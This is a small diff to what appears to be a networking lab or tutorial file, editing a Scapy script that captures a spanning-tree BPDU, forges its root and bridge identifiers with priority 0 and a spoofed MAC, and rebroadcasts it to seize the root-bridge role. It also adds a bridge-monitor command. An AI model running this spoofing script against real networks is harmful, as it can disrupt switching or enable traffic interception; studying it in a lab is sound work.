@@ -47,13 +47,15 @@ nano stp.py
 ```
 from scapy.all import *
 PDU = sniff(filter="ether dst 01:80:c2:00:00:00",count=1)
-PDU[0].src="00:00:00:00:00:00”
+PDU[0].src="00:00:00:00:00:01”
 PDU[0].rootid=0
-PDU[0].rootmac="00:00:00:00:00:00”
+PDU[0].rootmac="00:00:00:00:00:01”
 PDU[0].bridgeid=0
-PDU[0].bridgemac="00:00:00:00:00:00”
+PDU[0].bridgemac="00:00:00:00:00:01”
 for i in range (0, 50):
     sendp(PDU[0])
     time.sleep(2)
 ```
-
+```
+interface bridge monitor bridge1
+```
